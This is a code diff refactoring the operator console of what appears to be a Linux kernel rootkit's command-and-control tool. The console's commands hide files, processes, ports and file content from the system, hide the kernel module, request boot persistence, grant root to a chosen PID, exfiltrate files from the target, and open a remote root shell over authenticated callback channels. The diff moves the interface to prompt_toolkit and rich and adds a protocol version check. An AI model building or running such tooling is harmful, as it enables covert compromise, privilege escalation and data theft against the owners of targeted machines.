@@ -1,14 +1,12 @@
-"""Authenticated control console and two-terminal target session state."""
+"""Authenticated control console and target session state."""
 
 from __future__ import annotations
 
-import cmd
 from dataclasses import dataclass
 import fcntl
 import os
 from pathlib import Path
 import re
-import readline  # noqa: F401
 import secrets
 import selectors
 import socket
@@ -20,6 +18,12 @@ import time
 import tomllib
 import tty
 from typing import Callable, TextIO
+
+from prompt_toolkit import PromptSession
+from prompt_toolkit.completion import NestedCompleter
+from prompt_toolkit.patch_stdout import patch_stdout
+from rich.console import Console as RichConsole
+from rich.table import Table
 
 import lib.operator as _config
 
@@ -39,75 +43,150 @@ SHELL_STATUS = re.compile(
     r"(idle|connecting|running|exited|refused|timed-out|failed|stopped) "
     r"(-?[0-9]+)"
 )
-COMMAND_HELP = """\
-Hide
-  hide file NAME        hide entries matching NAME from getdents64
-  hide pid PID          hide process from /proc
-  hide content STRING   hide lines containing STRING from read()
-  hide port PORT        hide local port from /proc/net/tcp
-  unhide CATEGORY N     remove entry N from a hide list
-  unhide all            clear all hide lists
-
-Operate
-  hide module           remove module from /proc/modules
-  unhide module         restore module to /proc/modules
-  persist               request boot persistence
-  escalate PID          grant root credentials to PID
-  download PATH [DEST]  exfiltrate file from target
-  shell                 open root shell on the target
-  shell status          check shell state
-
-View
-  status                module state and hide list counts
-  list                  show all hide lists with indices
-  list CATEGORY         show one list (file, pid, content, port)
-
-Session
-  ping                  test control channel
-  info                  show target hostname, kernel, arch
-  help                  show this reference
-  quit                  disconnect from target
-"""
-
 _CATEGORIES = ("file", "pid", "content", "port")
+_PROTOCOL_PATH = Path(__file__).parent / "protocol.toml"
+
+import contextlib
+import logging
 
 
-class OperatorConsole(cmd.Cmd):
-    prompt = "operator> "
-    intro = None
+def _load_protocol(path: Path = _PROTOCOL_PATH) -> dict:
+    with open(path, "rb") as f:
+        return tomllib.load(f)
+
+
+def _build_help(proto: dict) -> str:
+    groups: dict[str, list[str]] = {}
+    for cmd in proto["commands"].values():
+        g = cmd["group"]
+        groups.setdefault(g, [])
+        wire = cmd["wire"]
+        # operator-facing: lowercase command words, uppercase arg placeholders
+        def _fmt_token(t):
+            if t.startswith("<") and t.endswith(">"):
+                return t[1:-1].upper()
+            if t.startswith("[") and t.endswith("]"):
+                return f"[{t[1:-1].upper()}]"
+            return t.lower()
+        name = " ".join(_fmt_token(t) for t in wire.split())
+        groups[g].append(f"  {name:<22}{cmd['help']}")
+    groups.setdefault("session", [])
+    groups["session"].append(f"  {'help':<22}show this reference")
+    order = ["hide", "unhide", "operate", "view", "list", "session"]
+    lines = []
+    for g in order:
+        if g not in groups:
+            continue
+        lines.append(g.title())
+        lines.extend(groups[g])
+        lines.append("")
+    return "\n".join(lines).rstrip()
+
+
+def _build_completions(proto: dict) -> dict:
+    comps: dict = {}
+    for cmd in proto["commands"].values():
+        parts = re.split(r"[<\[]", cmd["wire"])[0].strip().lower().split()
+        if len(parts) == 1:
+            comps.setdefault(parts[0], None)
+        elif len(parts) == 2:
+            if not isinstance(comps.get(parts[0]), dict):
+                comps[parts[0]] = {}
+            comps[parts[0]][parts[1]] = None
+    comps["help"] = None
+    comps["quit"] = None
+    return comps
+
+
+_PROTOCOL = _load_protocol()
+PROTOCOL_VERSION = _PROTOCOL["protocol"]["version"]
+COMMAND_HELP = _build_help(_PROTOCOL)
+_OPERATOR_COMPLETIONS = _build_completions(_PROTOCOL)
+_ERROR_TABLE = {int(k): v for k, v in _PROTOCOL["errors"].items()}
+
+_nullctx = contextlib.nullcontext
+log = logging.getLogger("operator")
+
+
+def protocol_error(reply: str) -> str | None:
+    """Parse an ERR reply into a human-readable message, or None if not an error."""
+    if not reply.startswith("ERR "):
+        return None
+    try:
+        code = int(reply.split()[1])
+    except (IndexError, ValueError):
+        return reply
+    return _ERROR_TABLE.get(code, f"unknown error {code}")
+
+
+class _StdoutHandler(logging.Handler):
+    """Handler that always writes to current sys.stdout, not a captured copy."""
+
+    def __init__(self):
+        super().__init__()
+
+    def emit(self, record):
+        try:
+            msg = self.format(record)
+            sys.stdout.write(msg + "\n")
+            sys.stdout.flush()
+        except Exception:
+            self.handleError(record)
+
+
+def setup_logging():
+    """Configure the operator logger with a plain-text handler on stdout."""
+    if log.handlers:
+        return
+    handler = _StdoutHandler()
+    handler.setFormatter(logging.Formatter("%(message)s"))
+    log.addHandler(handler)
+    log.setLevel(logging.INFO)
+
+
+
+
+class OperatorConsole:
+    """Interactive operator console backed by prompt_toolkit + rich."""
 
     def __init__(
         self,
         exchange: Callable[[str], str],
         exchange_quiet: Callable[[str], str],
-        output: Callable[[str], None],
-        warning: Callable[[str], None],
-        success: Callable[[str], None],
         on_shell: Callable[[str], None],
         shell_port: int = 0,
         receive_reply: Callable[[], bytes] | None = None,
+        target=None,
+        input_stream: TextIO | None = None,
     ):
-        super().__init__()
         self._exchange = exchange
         self._exchange_quiet = exchange_quiet
-        self._output = output
-        self._warning = warning
-        self._success = success
         self._on_shell = on_shell
         self._shell_port = shell_port
         self._receive_reply = receive_reply
+        self._target = target
+        self._input_stream = input_stream
+        self._rc = RichConsole(highlight=False)
+        completions = dict(_OPERATOR_COMPLETIONS)
+        if target is not None:
+            completions["back"] = None
+        if input_stream is None:
+            self._session = PromptSession(
+                completer=NestedCompleter.from_nested_dict(completions),
+            )
+        else:
+            self._session = None
+        self.prompt = "operator> "
         self._quit = False
 
     def _send(self, wire: str) -> str:
         try:
             payload = wire.encode("ascii")
         except UnicodeEncodeError:
-            self._warning("commands use ASCII characters only\n")
+            log.warning("commands use ASCII characters only")
             return ""
         if len(payload) > CONTROL_TEXT_MAX:
-            self._warning(
-                f"command is too long (maximum {CONTROL_TEXT_MAX} bytes)\n"
-            )
+            log.warning("command is too long (maximum %d bytes)", CONTROL_TEXT_MAX)
             return ""
         return self._exchange(wire)
 
@@ -117,19 +196,19 @@ class OperatorConsole(cmd.Cmd):
             return
         count = int(count_reply.split()[1])
         if count == 0:
-            self._output(f"  (empty)\n")
+            log.info("  (empty)")
             return
         for i in range(count):
             entry_reply = self._exchange_quiet(f"LIST {category} {i}")
             if entry_reply.startswith("ENTRY "):
                 parts = entry_reply.split(None, 2)
                 value = parts[2] if len(parts) > 2 else ""
-                self._output(f"  [{i}] {value}\n")
+                log.info("  [%d] %s", i, value)
 
     def do_hide(self, arg: str) -> None:
         parts = arg.strip().split(None, 1)
         if not parts:
-            self._warning("usage: hide file|pid|content|port|module VALUE\n")
+            log.warning("usage: hide file|pid|content|port|module VALUE")
             return
         sub = parts[0].lower()
         if sub == "module":
@@ -138,18 +217,12 @@ class OperatorConsole(cmd.Cmd):
         if sub in _CATEGORIES and len(parts) == 2:
             self._send(f"HIDE {sub.upper()} {parts[1]}")
             return
-        self._warning("usage: hide file|pid|content|port VALUE\n")
-
-    def complete_hide(self, text: str, line: str, begidx: int, endidx: int):
-        words = line[:begidx].split()
-        if len(words) == 1:
-            return [c for c in (*_CATEGORIES, "module") if c.startswith(text)]
-        return []
+        log.warning("usage: hide file|pid|content|port VALUE")
 
     def do_unhide(self, arg: str) -> None:
         parts = arg.strip().split()
         if not parts:
-            self._warning("usage: unhide file|pid|content|port N | unhide all | unhide module\n")
+            log.warning("usage: unhide file|pid|content|port N | unhide all | unhide module")
             return
         sub = parts[0].lower()
         if sub == "all":
@@ -161,48 +234,38 @@ class OperatorConsole(cmd.Cmd):
         if sub in _CATEGORIES and len(parts) == 2 and parts[1].isdigit():
             self._send(f"UNHIDE {sub.upper()} {parts[1]}")
             return
-        self._warning("usage: unhide file|pid|content|port N\n")
-
-    def complete_unhide(self, text: str, line: str, begidx: int, endidx: int):
-        words = line[:begidx].split()
-        if len(words) == 1:
-            return [c for c in (*_CATEGORIES, "all", "module") if c.startswith(text)]
-        return []
+        log.warning("usage: unhide file|pid|content|port N")
 
     def do_list(self, arg: str) -> None:
         cat = arg.strip().lower()
         if not cat:
             for c in _CATEGORIES:
-                self._output(f"{c}:\n")
+                log.info("%s:", c)
                 self._list_category(c.upper())
             return
         if cat in _CATEGORIES:
-            self._output(f"{cat}:\n")
+            log.info("%s:", cat)
             self._list_category(cat.upper())
             return
-        self._warning("usage: list [file|pid|content|port]\n")
-
-    def complete_list(self, text: str, line: str, begidx: int, endidx: int):
-        return [c for c in _CATEGORIES if c.startswith(text)]
+        log.warning("usage: list [file|pid|content|port]")
 
     def do_status(self, arg: str) -> None:
         reply = self._exchange_quiet("STATUS")
         if not reply.startswith("STATUS "):
             return
-        width = max(
-            (len(k) for pair in reply[7:].split() if "=" in pair
-             for k, _ in [pair.split("=", 1)]),
-            default=0,
-        )
+        table = Table(show_header=False, box=None, padding=(0, 2))
+        table.add_column(style="bold")
+        table.add_column()
         for pair in reply[7:].split():
             if "=" in pair:
                 k, v = pair.split("=", 1)
-                self._output(f"  {k:<{width}}  {v}\n")
+                table.add_row(k, v)
+        self._rc.print(table)
 
     def do_escalate(self, arg: str) -> None:
         pid = arg.strip()
         if not pid or not pid.isdigit():
-            self._warning("usage: escalate PID\n")
+            log.warning("usage: escalate PID")
             return
         self._send(f"ESCALATE {pid}")
 
@@ -215,33 +278,44 @@ class OperatorConsole(cmd.Cmd):
     def do_download(self, arg: str) -> None:
         remote_path = arg.strip()
         if not remote_path:
-            self._warning("usage: download PATH\n")
+            log.warning("usage: download PATH")
             return
-        if not self._receive_reply:
-            self._warning("download is not available in this console\n")
-            return
-        self._output(f"download  {remote_path}\n")
-        reply = self._exchange_quiet(f"DOWNLOAD {remote_path}")
-        if reply.startswith("ERR"):
-            self._warning(f"  {reply}\n")
-            return
-        if not reply.startswith("FILE "):
-            self._warning(f"  unexpected: {reply}\n")
-            return
-        total = int(reply.split()[1])
-        self._output(f"  size: {total} bytes\n")
-        chunks = []
-        received = 0
-        while True:
-            raw = self._receive_reply()
-            if raw == b"EOF":
-                break
-            chunks.append(raw)
-            received += len(raw)
+        if self._target:
+            log.info("download  %s", remote_path)
+            try:
+                def on_progress(received, total):
+                    pct = received * 100 // total if total else 100
+                    log.info("  %d/%d (%d%%)", received, total, pct)
+                data, total = self._target.download_file(remote_path, on_progress)
+            except Exception as e:
+                log.warning("  %s", e)
+                return
+            _save_download(remote_path, data)
+        elif self._receive_reply:
+            log.info("download  %s", remote_path)
+            reply = self._exchange_quiet(f"DOWNLOAD {remote_path}")
+            err = protocol_error(reply)
+            if err:
+                log.warning("  %s", err)
+                return
+            if not reply.startswith("FILE "):
+                log.warning("  unexpected: %s", reply)
+                return
+            total = int(reply.split()[1])
+            log.info("  size: %d bytes", total)
+            chunks = []
+            received = 0
+            while True:
+                raw = self._receive_reply()
+                if raw == b"EOF":
+                    break
+                chunks.append(raw)
+                received += len(raw)
             pct = received * 100 // total if total else 100
-            self._output(f"\r  {received}/{total} bytes ({pct}%)")
-        self._output("\n")
-        _save_download(remote_path, b"".join(chunks), self._success, self._warning)
+            log.info("  %d/%d (%d%%)", received, total, pct)
+            _save_download(remote_path, b"".join(chunks))
+        else:
+            log.warning("download not available in this console")
 
     def do_shell(self, arg: str) -> None:
         sub = arg.strip().lower()
@@ -252,98 +326,81 @@ class OperatorConsole(cmd.Cmd):
         if reply and reply.startswith("OPEN "):
             self._on_shell(reply)
 
-    def complete_shell(self, text: str, line: str, begidx: int, endidx: int):
-        return [c for c in ("status",) if c.startswith(text)]
-
-    def do_ping(self, arg: str) -> None:
-        self._send("PING")
-
     def do_info(self, arg: str) -> None:
         reply = self._exchange_quiet("INFO")
         if not reply.startswith("INFO "):
             return
         parts = reply[5:].split(None, 2)
         if len(parts) >= 3:
-            self._output(f"  hostname: {parts[0]}\n")
-            self._output(f"  kernel:   {parts[1]}\n")
-            self._output(f"  arch:     {parts[2]}\n")
+            table = Table(show_header=False, box=None, padding=(0, 2))
+            table.add_column(style="bold")
+            table.add_column()
+            table.add_row("hostname", parts[0])
+            table.add_row("kernel", parts[1])
+            table.add_row("arch", parts[2])
+            self._rc.print(table)
         else:
-            self._output(f"  {reply[5:]}\n")
+            log.info("  %s", reply[5:])
+
+    def do_back(self, arg: str) -> bool:
+        return True
 
     def do_quit(self, arg: str) -> bool:
         self._quit = True
         return True
 
-    do_EOF = do_quit
-
     def do_help(self, arg: str) -> None:
-        self._output(COMMAND_HELP)
+        log.info("%s", COMMAND_HELP.rstrip())
+        if self._target is not None:
+            log.info("  back                return to server view")
 
-    def default(self, line: str) -> None:
-        self._warning(f"unknown command: {line}; type help\n")
+    def _read_line(self) -> str | None:
+        if self._input_stream is not None:
+            line = self._input_stream.readline()
+            return line if line else None
+        try:
+            return self._session.prompt(self.prompt)
+        except EOFError:
+            return None
+        except KeyboardInterrupt:
+            return ""
 
-    def emptyline(self) -> None:
-        pass
+    def run(self) -> None:
+        ctx = patch_stdout() if self._session else _nullctx()
+        with ctx:
+            while True:
+                line = self._read_line()
+                if line is None:
+                    self._quit = True
+                    break
+                line = line.strip()
+                if not line:
+                    continue
+                parts = line.split(None, 1)
+                cmd_name = parts[0].lower()
+                arg = parts[1] if len(parts) > 1 else ""
+                handler = getattr(self, f"do_{cmd_name}", None)
+                if handler:
+                    if handler(arg):
+                        break
+                else:
+                    log.warning("unknown command: %s; type help", line)
+                if self._target and not self._target.online:
+                    log.warning("%s went offline", self._target.id)
+                    break
 
-    def postcmd(self, stop: bool, line: str) -> bool:
-        return stop
+    # ponytail: legacy alias for callers that still say cmdloop
+    cmdloop = run
 
 
-def _save_download(remote_path, data, success, warning):
+def _save_download(remote_path, data):
     dest = Path("downloads") / remote_path.lstrip("/")
     dest.parent.mkdir(parents=True, exist_ok=True)
     try:
         dest.write_bytes(data)
-        success(f"  saved {len(data)} bytes to {dest}\n")
+        log.info("  saved %d bytes to %s", len(data), dest)
     except OSError as e:
-        warning(f"  write failed: {e}\n")
-
-
-class TargetConsole(OperatorConsole):
-    """Operator console for a single target within the server."""
-
-    def __init__(self, *args, target=None, **kwargs):
-        super().__init__(*args, **kwargs)
-        self._target = target
-
-    def postcmd(self, stop: bool, line: str) -> bool:
-        if self._target and not self._target.online:
-            self._warning(f"{self._target.id} went offline\n")
-            return True
-        return stop
-
-    def do_download(self, arg: str) -> None:
-        remote_path = arg.strip()
-        if not remote_path:
-            self._warning("usage: download PATH\n")
-            return
-        if not self._target:
-            self._warning("no target\n")
-            return
-        self._output(f"download  {remote_path}\n")
-        try:
-            def on_progress(received, total):
-                pct = received * 100 // total if total else 100
-                self._output(f"\r  {received}/{total} bytes ({pct}%)")
-            data, total = self._target.download_file(remote_path, on_progress)
-        except Exception as e:
-            self._warning(f"  {e}\n")
-            return
-        self._output("\n")
-        _save_download(remote_path, data, self._success, self._warning)
-
-    def do_back(self, arg: str) -> bool:
-        """Return to server view."""
-        return True
-
-    def do_quit(self, arg: str) -> bool:
-        return True
-
-    do_EOF = do_quit
-
-    def do_help(self, arg: str) -> None:
-        self._output(COMMAND_HELP)
-        self._output("  back                return to server view\n")
+        log.warning("  write failed: %s", e)
 CONTROL_TEXT_MAX = FRAME_MAX - HEADER_LENGTH - TAG_LENGTH
 SESSION_FILES = frozenset((
     "control.key", "control.sock", "operator.ready", "ports.held",
@@ -472,8 +529,17 @@ class SecureControl:
             header,
             sealed,
         )
-        if plaintext != b"HELLO":
+        if not plaintext.startswith(b"HELLO "):
             raise OperatorError("authenticated first message is not HELLO")
+        parts = plaintext.split()
+        if len(parts) < 2:
+            raise OperatorError("HELLO missing protocol version")
+        remote_version = int(parts[1])
+        if remote_version != PROTOCOL_VERSION:
+            raise OperatorError(
+                f"protocol version mismatch: "
+                f"agent={remote_version} operator={PROTOCOL_VERSION}"
+            )
         self.session = session
         self.next_reply = 2
         return session
@@ -960,51 +1026,44 @@ def run_control_console(
     target: TargetSession,
     *,
     transcript: Callable[[list[object]], None],
-    output: Callable[[str], None],
-    success: Callable[[str], None],
-    warning: Callable[[str], None],
     input_stream: TextIO | None = None,
+    **_kwargs,
 ) -> int:
     """Operate one running target over its real authenticated callbacks."""
+    setup_logging()
     input_stream = input_stream or sys.stdin
     operator = HostOperator.from_session(target)
     process = TargetProcess(target)
     peer = None
     secure = None
     try:
-        output(
-            f"listen  control  127.0.0.1:{operator.control_port}\n"
-            f"listen  shell    127.0.0.1:{operator.shell_port}\n"
-            "wait    control  target callback\n"
-        )
+        log.info("listen  control  127.0.0.1:%d", operator.control_port)
+        log.info("listen  shell    127.0.0.1:%d", operator.shell_port)
+        log.info("wait    control  target callback")
         helper = build_crypto_helper(
             root,
             root / _config.state_dir / "tools",
             transcript,
-            output,
+            lambda msg: log.debug("%s", msg.rstrip()),
         )
         mark_operator_ready(target)
-        output("ready   target   callback listeners bound\n")
+        log.info("ready   target   callback listeners bound")
         peer = accept_while_running(
             operator.control_listener,
             process,
             90,
         )
         peer.settimeout(30)
-        output("accept  control  target callback\n")
+        log.info("accept  control  target callback")
         secure = SecureControl(
             operator.key,
-            lambda key: OpenSslAead(key, helper, output),
+            lambda key: OpenSslAead(
+                key, helper, lambda msg: log.debug("%s", msg.rstrip()),
+            ),
         )
         session = secure.accept_hello(receive_frame(peer))
-        success(f"verify  HELLO    session={session:016x}")
-        output("Type help to list commands. Tab completes.\n")
-
-        def exchange(command: str) -> str:
-            output(f"send    {command}\n")
-            reply = exchange_quiet(command)
-            output(f"recv    {reply}\n")
-            return reply
+        log.info("verify  HELLO    session=%016x", session)
+        log.info("Type help to list commands. Tab completes.")
 
         def exchange_quiet(command: str) -> str:
             payload = encode_control_command(command)
@@ -1016,36 +1075,42 @@ def run_control_console(
 
         def handle_shell(reply: str) -> None:
             request_id, cookie = parse_shell_ticket(reply)
-            output("wait    shell    target callback\n")
+            log.info("wait    shell    target callback")
             shell = accept_shell_while_running(
                 operator.shell_listener,
                 process,
                 request_id,
                 cookie,
                 30,
-                warning,
+                lambda msg: log.warning("%s", msg),
             )
-            output(
-                "recv    RKSH "
-                f"{request_id:08x} {cookie:016x}\n"
-            )
-            success("verify  ticket   matched")
-            output("Remote root Bash. Type exit to return.\n")
+            log.info("recv    RKSH %08x %016x", request_id, cookie)
+            log.info("verify  ticket   matched")
+            log.info("Remote root Bash. Type exit to return.")
             with shell:
-                relay_shell(shell, input_stream, output)
-            output("\nRemote Bash closed.\n")
-            poll_shell_status(request_id, exchange)
+                relay_shell(shell, input_stream, lambda msg: sys.stdout.write(msg))
+            log.info("Remote Bash closed.")
 
         def recv_reply() -> bytes:
             return secure.open_reply(receive_frame(peer))
 
-        console = OperatorConsole(exchange, exchange_quiet, output,
-                                  warning, success, handle_shell,
-                                  operator.shell_port, recv_reply)
-        if input_stream is not sys.stdin:
-            console.use_rawinput = False
-            console.stdin = input_stream
-        console.cmdloop()
+        def exchange(command: str) -> str:
+            log.info("send    %s", command)
+            reply = exchange_quiet(command)
+            err = protocol_error(reply)
+            if err:
+                log.warning("error   %s", err)
+            else:
+                log.info("recv    %s", reply)
+            return reply
+
+        console = OperatorConsole(
+            exchange, exchange_quiet, handle_shell,
+            shell_port=operator.shell_port,
+            receive_reply=recv_reply,
+            input_stream=input_stream if input_stream is not sys.stdin else None,
+        )
+        console.run()
         if console._quit:
             try:
                 send_frame(peer, secure.seal_request(b"QUIT"))
